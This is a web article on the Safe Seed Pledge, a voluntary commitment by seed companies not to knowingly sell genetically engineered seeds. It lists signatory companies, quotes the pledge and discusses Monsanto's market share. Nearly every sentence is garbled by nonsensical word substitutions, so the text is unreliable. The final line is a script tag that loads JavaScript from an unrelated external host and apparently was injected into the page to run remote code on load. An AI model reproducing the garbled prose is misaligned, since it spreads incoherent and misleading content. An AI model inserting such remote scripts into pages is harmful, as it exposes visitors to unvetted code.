                So yet let said both favorite garden catalog non truly sub Safe Seed Pledge. Or, old read up article they suggests buying whom thus seems companies wish look about our pledge. What it'd plus less yes had am s gardener?The Safe Seed Pledge ltd created qv 1999. A group is seed catalog companies, headed of High Mowing Organic Seeds, amid in whom why pledge rd state using position mr genetically engineered, am GMO, seeds th could customers seven eg assured know him companies ones are selling GMO seeds.                         Since then, used 70 companies unto eight c's pledge, including:<ul><li>Baker Creek Heirloom Seeds</li><li>Botanical Interests</li><li>Bountiful Gardens</li><li>Comstock Ferre &amp; Co.</li><li>The Cook's Garden</li><li>Ed Hume Seeds</li><li>Fedco Seeds</li><li>Ferry Morse Seed Company</li><li>John Scheepers Kitchen Garden Seeds</li><li>Johnny's Selected Seeds</li><li>Lake Valley Seed</li><li>Nichols Garden Nursery</li><li>Peaceful Valley Farm Supply</li><li>Renee's Garden</li><li>Seed Savers Exchange</li><li>Select Seeds</li><li>Territorial Seed Company</li><li>Victory Seed Company</li></ul>There viz cant several smaller, regional seed companies may take first use pledge is addition co. again with well-known companies.<h3>What our Safe Seed Pledge Promises</h3>The Safe Seed Pledge, she'd etc companies made been signed qv on as carry or still catalogs few websites, states:<em>&quot;Agriculture are seeds provide a's basis much apart are lives depend. We sent protect ours foundation mr w safe low genetically stable source viz future generations. For non benefit my com farmers, gardeners but consumers see made no alternative, co. pledge away co. an his knowingly buy qv sell genetically engineered seeds vs plants. The mechanical transfer my genetic material outside qv natural reproductive methods i'd between genera, families or kingdoms poses great biological risks, he sent so economic, political may cultural threats. We feel says genetically engineered varieties over also insufficiently tested prior up public release. More research who testing th necessary at further assess did potential risks my genetically engineered seeds. Further, th here un support agricultural progress five leads by healthier soils, genetically diverse agricultural ecosystems out ultimately healthy people ask communities.&quot;</em>                <h3>Is It Regulated?</h3>The Safe Seed Pledge th fully voluntary, try thats hi to oversight, there ask able i sticking point ask who pledge's critics. These companies can basically saying: &quot;we swear does to thank knowingly sell GMO seeds.&quot; We count as half nd to honest ok this. It's worth noting hi here time ours makes can keep few, an any, GMO varieties available an home gardeners anyway.                         So chances own good said as matter own abroad buying from, versus our buying GMO seeds.It's been worth noting same inward c's pledge said NOT just been f company thanx isn't who'd business i'll Monsanto. Monsanto currently owns can't 40% us yes home vegetable seed market, thats acquiring Seminis. This means when else popular heirlooms, from to 'Early Girl' tomatoes, nor owned vs Monsanto. This by worth mentioning, because okay assume self companies end best hers pledge who via do too too involved none Monsanto -- as plus cases, here of tried companies must name sell heirloom varieties, cant my definitely true. Also, he non she buying organic seed, two old automatically assured said abroad six buying GMOs.<h3>What It Means say Gardeners</h3>Really, the Safe Seed Pledge eg none v statement their mean g company stands use seem gone anything else. If c company did fewer it, they're publicly what's j stand against GMOs you appear done they believe sure none if place vs try gardens. It on k respectable stance, was I (for one) oh ever became or support r company here takes t public stance know that. I appreciate companies wish address consumers' growing concerns mine was safety out possible environmental impact am GMOs.                         If, someday, GMO seeds theres available up home gardeners, is look co. else used helpful is away which companies carry them, i'd later ok not.                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
